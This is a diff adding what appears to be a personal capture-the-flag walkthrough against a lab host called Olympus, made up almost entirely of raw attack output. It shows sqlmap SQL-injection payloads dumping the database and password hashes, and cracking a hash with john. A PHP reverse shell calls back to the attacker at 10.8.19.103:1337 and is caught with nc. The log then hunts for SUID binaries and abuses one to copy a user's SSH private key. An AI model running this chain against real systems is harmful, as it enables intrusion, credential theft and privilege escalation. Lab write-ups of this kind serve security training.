@@ -314,3 +314,319 @@ banner: '8.0.28-0ubuntu0.20.04.3'
 [*] starting @ 16:53:15 //
 
 [16:53:15] [INFO] parsing HTTP request from 'req.txt'
+[16:53:16] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[16:53:16] [INFO] resuming back-end DBMS 'mysql' 
+[16:53:16] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: search (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: search=evOa' OR NOT 6056=6056#&submit=
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: search=evOa' AND GTID_SUBSET(CONCAT(0x7170717071,(SELECT (ELT(8177=8177,1))),0x71716b7071),8177)-- ulQM&submit=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: search=evOa' AND (SELECT 2484 FROM (SELECT(SLEEP(5)))xEXF)-- hUjp&submit=
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 10 columns
+    Payload: search=evOa' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170717071,0x52705079424c6952787566676f636e636a6749776b4a6e7751584e514558715853524c6270566e6e,0x71716b7071),NULL,NULL,NULL,NULL,NULL#&submit=
+---
+[16:53:17] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.6
+[16:53:17] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[16:53:17] [INFO] fetching current database
+[16:53:17] [INFO] fetching tables for database: 'olympus'
+[16:53:18] [INFO] fetching columns for table 'flag' in database 'olympus'
+[16:53:18] [INFO] fetching entries for table 'flag' in database 'olympus'
+Database: olympus
+Table: flag
+[1 entry]
++---------------------------+
+| flag                      |
++---------------------------+
+| flag{Sm4rt!_k33P_d1gGIng} |
++---------------------------+
+
+[16:53:20] [INFO] table 'olympus.flag' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/flag.csv'
+[16:53:20] [INFO] fetching columns for table 'categories' in database 'olympus'
+[16:53:20] [INFO] fetching entries for table 'categories' in database 'olympus'
+Database: olympus
+Table: categories
+[5 entries]
++--------+------------+
+| cat_id | cat_title  |
++--------+------------+
+| 1      | News       |
+| 2      | Technology |
+| 3      | Tutorials  |
+| 7      | Business   |
+| 8      | Education  |
++--------+------------+
+
+[16:53:21] [INFO] table 'olympus.categories' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/categories.csv'
+[16:53:21] [INFO] fetching columns for table 'chats' in database 'olympus'
+[16:53:22] [INFO] fetching entries for table 'chats' in database 'olympus'
+Database: olympus
+Table: chats
+[3 entries]
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
+| dt         | msg                                                                                                                                                             | file                                 | uname      |
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
+|  | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
+|  | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
+|  | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
+
+[16:53:22] [INFO] table 'olympus.chats' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/chats.csv'
+[16:53:22] [INFO] fetching columns for table 'users' in database 'olympus'
+[16:53:22] [INFO] fetching entries for table 'users' in database 'olympus'
+Database: olympus
+Table: users
+[3 entries]
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
+| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
+| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+
+[16:53:23] [INFO] table 'olympus.users' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/users.csv'
+[16:53:23] [INFO] fetching columns for table 'comments' in database 'olympus'
+[16:53:23] [INFO] fetching entries for table 'comments' in database 'olympus'
+Database: olympus
+Table: comments
+[1 entry]
++------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| comment_id | comment_post_id | comment_date | comment_email | comment_author | comment_status | comment_content                                                                                                                                                           |
++------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1          | 2               |    | <blank>       | prometheus     | approved       | Heyyy ! You've done a damn good but unsecured job ^^\r\n\r\nI've patched a few things on my way, but I managed to hack my self into the olympus !\r\n\r\ncheerio ! \r\n=P |
++------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+[16:53:23] [INFO] table 'olympus.comments' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/comments.csv'
+[16:53:23] [INFO] fetching columns for table 'posts' in database 'olympus'
+[16:53:23] [INFO] fetching entries for table 'posts' in database 'olympus'
+Database: olympus
+Table: posts
+[3 entries]
++---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
+| post_id | post_category_id | post_date  | post_tags               | post_image      | post_title           | post_author | post_status | post_content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | post_comment_count |
++---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
+| 2       | 1                | 2022-04-22 | first, post             | img.jpg         | Dear Gods and Godess | root        | publish     | <div class="wp-container-7 entry-content wp-block-post-content" style="text-align: center;">\r\n<p><strong>This is the first version of the Olympus website. It should become a platform for each and everyone of you to express their needs and desires. Humans should not be allowed to visit it.</strong></p>\r\n<p><strong>You have all been sent a username and a password (that you will need to change ASAP) that will allow you to join the Olympus and create articles.</strong></p>\r\n<p><strong>I hope you will like this website,</strong></p>\r\n<p><strong>Yours, root@the-it-guy</strong></p>\r\n</div>[16:53:24] [WARNING] writing binary ('application/octet-stream') content to file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/post_content-42421143.bin' 
+| <blank>            |
+| 3       | 1                | 2022-04-27 | credentials,security,it | 61X1U2-xUTL.jpg | Credentials          | root        | publish     | <p><strong>Dear Gods and Godess, I found out that some of you (not everyone thankfully) use really common passwords.</strong></p>\r\n<p><strong>As I remind you, we have a wordlist of forbidden password that you should use. </strong></p>\r\n<p><strong>Please update your passwords.</strong></p>\r\n<p>\xa0</p>\r\n<p><strong>Yours, root@the-it-guy</strong></p>                                                                                                                                                                                                                                                 [16:53:24] [WARNING] writing binary ('application/octet-stream') content to file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/post_content-53792449.bin' 
+| <blank>            |
+| 6       | 1                |  | update                  | <blank>         | Update is comming    | root        | publish     | <p style="text-align: center;"><strong>Dear gods and goddess,</strong><br /><strong>Once more, your IT god snapped his finger and here it goes :</strong><br /><strong>Olympus becomes something else, something bigger, something better.</strong><br /><strong>You will find every instruction, should you need them, here.</strong><br /><br /><strong>HOWEVER, DO NOT FORGET TO UPDATE YOUR E-MAIL ON YOUR ACCOUNT PROFILE.</strong><br /><br /><strong>root@the-it-department</strong> </p>                                                                                                                                                                   | <blank>            |
++---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
+
+[16:53:24] [INFO] table 'olympus.posts' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/posts.csv'
+[16:53:24] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/olympus.thm'
+
+[*] ending @ 16:53:24 //
+
+┌──(witty㉿kali)-[/tmp]
+└─$ tac /etc/hosts
+10.10.96.50 olympus.thm chat.olympus.thm
+
+┌──(witty㉿kali)-[/tmp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash        
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+summertime       (?)     
+1g 0:00:01:32 DONE () 0.01085g/s 43.75p/s 43.75c/s 43.75C/s 19861986..pokpok
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(witty㉿kali)-[/tmp]
+└─$ cat hash   
+$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
+
+prometheus:summertime (login chat.olympus.thm) 
+
+upload revshell
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ tail payload_ivan.php
+}
+echo '<pre>';
+// change the host address and/or port number as necessary
+$sh = new Shell('10.8.19.103', 1337);
+$sh->run();
+unset($sh);
+// garbage collector requires PHP v5.3.0 or greater
+// @gc_collect_cycles();
+echo '</pre>';
+?> 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ dirsearch -u http://chat.olympus.thm/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613
+
+Output File: /home/witty/.dirsearch/reports/chat.olympus.thm/-_23-04-29_17-09-22.txt
+
+Error Log: /home/witty/.dirsearch/logs/errors-23-04-29_17-09-22.log
+
+Target: http://chat.olympus.thm/
+
+[17:09:23] Starting: 
+[17:09:56] 302 -    0B  - /index.php  ->  login.php
+[17:09:58] 301 -  325B  - /javascript  ->  http://chat.olympus.thm/javascript/
+[17:10:28] 301 -  321B  - /static  ->  http://chat.olympus.thm/static/
+[17:10:35] 301 -  322B  - /uploads  ->  http://chat.olympus.thm/uploads/
+
+Task Completed
+
+┌──(witty㉿kali)-[/tmp]
+└─$ sqlmap -r req1.txt --tamper=space2comment --level 2 --risk 2  -D olympus -T chats -C file --dump
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.7.2#stable}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:39:11 //
+
+[17:39:11] [INFO] parsing HTTP request from 'req1.txt'
+[17:39:11] [INFO] loading tamper module 'space2comment'
+[17:39:12] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[17:39:12] [INFO] resuming back-end DBMS 'mysql' 
+[17:39:12] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: search (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: search=evOa' OR NOT 6056=6056#&submit=
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: search=evOa' AND GTID_SUBSET(CONCAT(0x7170717071,(SELECT (ELT(8177=8177,1))),0x71716b7071),8177)-- ulQM&submit=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: search=evOa' AND (SELECT 2484 FROM (SELECT(SLEEP(5)))xEXF)-- hUjp&submit=
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 10 columns
+    Payload: search=evOa' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170717071,0x52705079424c6952787566676f636e636a6749776b4a6e7751584e514558715853524c6270566e6e,0x71716b7071),NULL,NULL,NULL,NULL,NULL#&submit=
+---
+[17:39:13] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[17:39:13] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.6
+[17:39:13] [INFO] fetching entries of column(s) 'file' for table 'chats' in database 'olympus'
+Database: olympus
+Table: chats
+[5 entries]
++--------------------------------------+
+| file                                 |
++--------------------------------------+
+| 47c3210d51761686f3af40a875eeaaea.txt |
+| 1505fa8a8d00136243bd333c44118103.php |
+|
+|
+|
++--------------------------------------+
+
+[17:39:15] [INFO] table 'olympus.chats' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/chats.csv'
+[17:39:15] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/olympus.thm'
+
+[*] ending @ 17:39:15 //
+
+go to http://chat.olympus.thm/uploads/1505fa8a8d00136243bd333c44118103.php
+
+revshell
+
+┌──(witty㉿kali)-[/tmp]
+└─$ rlwrap nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.222.120] 58404
+SOCKET: Shell has connected! PID: 1227
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ find / -perm -u=s -type f 2>/dev/null
+<html/uploads$ find / -perm -u=s -type f 2>/dev/null            
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/cputils
+
+www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ ls -lah /usr/bin/cputils
+<s.thm/public_html/uploads$ ls -lah /usr/bin/cputils            
+-rwsr-xr-x 1 zeus zeus 18K Apr 18  2022 /usr/bin/cputils
+
+www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ cd /home
+cd /home
+www-data@olympus:/home$ ls
+ls
+zeus
+www-data@olympus:/home$ cd zeus
+cd zeus
+www-data@olympus:/home/zeus$ ls -lah
+ls -lah
+total 48K
+drwxr-xr-x 7 zeus zeus 4.0K Apr 19  2022 .
+drwxr-xr-x 3 root root 4.0K Mar 22  2022 ..
+lrwxrwxrwx 1 root root    9 Mar 23  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 zeus zeus  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 zeus zeus 3.7K Feb 25  2020 .bashrc
+drwx------ 2 zeus zeus 4.0K Mar 22  2022 .cache
+drwx------ 3 zeus zeus 4.0K Apr 14  2022 .gnupg
+drwxrwxr-x 3 zeus zeus 4.0K Mar 23  2022 .local
+-rw-r--r-- 1 zeus zeus  807 Feb 25  2020 .profile
+drwx------ 2 zeus zeus 4.0K Apr 14  2022 .ssh
+-rw-r--r-- 1 zeus zeus    0 Mar 22  2022 .sudo_as_admin_successful
+drwx------ 3 zeus zeus 4.0K Apr 14  2022 snap
+-rw-rw-r-- 1 zeus zeus   34 Mar 23  2022 user.flag
+-r--r--r-- 1 zeus zeus  199 Apr 15  2022 zeus.txt
+www-data@olympus:/home/zeus$ cd .ssh
+cd .ssh
+bash: cd: .ssh: Permission denied
+
+www-data@olympus:/home/zeus$ cat zeus.txt
+cat zeus.txt
+Hey zeus !
+
+I managed to hack my way back into the olympus eventually.
+Looks like the IT kid messed up again !
+I've now got a permanent access as a super user to the olympus.
+
+						- Prometheus.
+
+www-data@olympus:/home/zeus$ /usr/bin/cputils
+/usr/bin/cputils
+  ____ ____        _   _ _     
+ / ___|  _ \ _   _| |_(_) |___ 
+| |   | |_) | | | | __| | / __|
+| |___|  __/| |_| | |_| | \__ \
+ \____|_|    \__,_|\__|_|_|___/
+                               
+Enter the Name of Source File: ./.ssh/id_rsa
+./.ssh/id_rsa
+
+Enter the Name of Target File: id_rsa
+id_rsa
+
+File copied successfully.
+www-data@olympus:/home/zeus$ ls
+ls
+id_rsa	snap  user.flag  zeus.txt
